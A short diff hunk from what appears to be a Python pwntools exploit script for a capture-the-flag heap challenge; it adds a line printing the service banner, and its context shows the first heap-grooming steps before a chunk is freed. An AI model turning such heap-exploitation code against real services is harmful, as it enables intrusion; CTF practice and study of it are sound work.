@@ -54,6 +54,9 @@ if LOCAL:
 else:
 	io = remote(HOST, PORT)
 
+# mmm ansi
+print io.recvuntil('stuff:')[:-16]
+
 # step 1: make sure the chunk we free is not bordering the top or bottom chunk
 add('A'*46, '0'*31, 'aa')
 add('B'*46, '1'*31, 'bb')
